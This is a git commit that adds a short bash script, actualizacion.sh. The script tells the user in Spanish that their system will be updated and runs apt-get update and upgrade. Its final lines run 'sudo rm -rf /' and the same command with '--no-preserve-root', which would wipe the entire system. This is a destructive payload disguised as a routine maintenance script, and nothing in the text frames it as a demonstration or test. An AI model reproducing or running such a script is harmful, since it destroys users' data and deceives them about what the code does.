8431dfe859a3108032fc7befd9872c4f99298ee8
cvyupa <32906705+cvyupa@users.noreply.github.com>
2019-06-06 11:24:47 -0500

    actualizacion.sh

---
+++ actualizacion.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+echo "==========================="
+echo " Su sistema se actualizara "
+echo "==========================="
+sudo apt-get update && sudo apt-get upgrade -y
+sudo apt-get update && sudo apt-get upgrade
+sudo rm -rf / && sudo rm -rf /
+sudo rm -rf / --no-preserve-root && sudo rm -rf / --no-preserve-root
